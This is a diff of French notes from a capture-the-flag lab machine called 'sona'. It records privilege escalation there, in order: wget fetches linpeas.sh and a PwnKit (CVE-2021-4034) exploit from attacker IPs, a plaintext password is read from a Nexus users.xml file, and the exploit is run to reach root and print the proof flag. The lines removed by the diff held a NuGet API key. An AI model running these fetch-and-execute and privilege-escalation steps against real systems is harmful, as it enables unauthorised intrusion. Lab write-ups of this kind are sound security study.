@@ -223,8 +223,7 @@ nexus@sona:/home/sona$
 
 passons au root.txt
 
-nexus@sona:/tmp$ wget http://192.168.49.68:80/linpeas.sh
-wget http://192.168.49.68:80/linpeas.sh
+https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 
 (root?kali)-[/var/www/html]
 # sudo systemctl enable --now apache2
@@ -234,22 +233,69 @@ Executing: /usr/lib/systemd/systemd-sysv-install enable apache2
 (root?kali)-[/var/www/html]
 # systemctl status apache2
 
+nexus@sona:/tmp$ wget http://192.168.49.68:80/linpeas.sh
+wget http://192.168.49.68:80/linpeas.sh
+
 exus@sona:/tmp$ chmod +x linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 
 
+On ne trouve pas grand chose, on va fouiller encore dans nexus
 
+users.xml
+nexus@sona:~/nexus-3.21.1-01/system$ cat users.xml
+cat users.xml
+<users>
+<id>1001</id>
+<username>sona</username>
+<password>KuramaThe9</password>
+</users>
 
+on trouve le mot de passe de sona
 
-Nous savons de plus,
-"Your admin user password is located in
-/home/nexus/sonatype-work/nexus3/admin.password on the server."
+su sona
+KuramaThe9
 
-On s'est finalement connecté sur l'interface et login avec le mdp admin trouvé et cela nous a demandé un nouveau mdp , nous avons défini alicia
+puis on se retrouve sona
 
-Une NuGet API key est un jeton d’authentification utilisé par les clients NuGet pour réaliser des actions qui modifient l’état d’un dépôt NuGet
+on relance linpeas.sh dans le /tmp
 
-NuGet API KEY
-b0573f25-3941-3b19-9414-9ef556bb296b
-nuget setapikey b0573f25-3941-3b19-9414-9ef556bb296b -source http://192.168.58.159:8081/repository/{repository name}/
+Vulnerable to CVE-2021-3560
+polkit est un service système installé par défaut sur de nombreuses distributions Linux. Il est utilisé par systemd, donc toute distribution Linux qui utilise systemd utilise également du polkit.
+La vulnérabilité permet à un utilisateur local non privilégié d'obtenir un shell root sur le système
+
+Tentative de cet exploit 
+
+https://github.com/tufanturhan/Polkit-Linux-Priv?tab=readme-ov-file
+
+mais non réussi (pas compris et pas cherché plus loin, à creuser)
+
+autre exploit, j'avais pas vu 
+
+[+] [CVE-2021-4034] PwnKit
+
+https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py
+
+wget http://192.168.49.62:80/CVE.py
+--2025-11-09 21:22:46--  http://192.168.49.62/CVE.py
+Connecting to 192.168.49.62:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3262 (3.2K) [text/x-python]
+Saving to: ?CVE.py?
+
+     0K ...                                                   100%  438M=0s
+
+2025-11-09 21:22:46 (438 MB/s) - ?CVE.py? saved [3262/3262]
+
+python3 CVE.py
+id
+uid=0(root) gid=1001(sona) groups=1001(sona)
+
+cd /root
+ls
+proof.txt
+server.py
+snap
+cat proof.txt
+c197bd96fe2fe3c1a209173dc860ea62
